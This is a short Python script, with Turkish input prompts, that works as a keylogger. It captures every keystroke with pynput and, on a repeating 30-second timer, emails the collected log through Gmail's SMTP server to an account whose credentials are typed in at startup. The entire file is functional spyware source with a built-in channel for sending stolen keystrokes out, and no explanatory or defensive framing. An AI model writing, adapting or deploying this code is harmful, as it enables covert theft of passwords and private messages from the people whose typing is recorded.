from pynput import keyboard
import smtplib
import threading
import optparse
gmail=input("Gmailini Gir: ")
password=input("Sifreni Gir: ")
log=""
def callback(key):
    global log
    try:
        log=log+str(key.char)
    except AttributeError:
        if key==key.space:
            log=log+" "
        elif key==key.enter:
            log=log+"\n"
        else:
            log=log+str(key)
def email_send(gmail,pw,message):
    emailsend=smtplib.SMTP("smtp.gmail.com",587)
    emailsend.starttls()
    emailsend.login(gmail,pw)
    emailsend.sendmail(gmail,gmail,message)
    emailsend.quit()
def thread():
    global log,gmail,password
    email_send(gmail,password,log.encode("utf-8"))
    log=""
    timer=threading.Timer(30,thread)
    timer.start()
keyloger=keyboard.Listener(on_press=callback)
with keyloger:
    thread()
    keyloger.join()

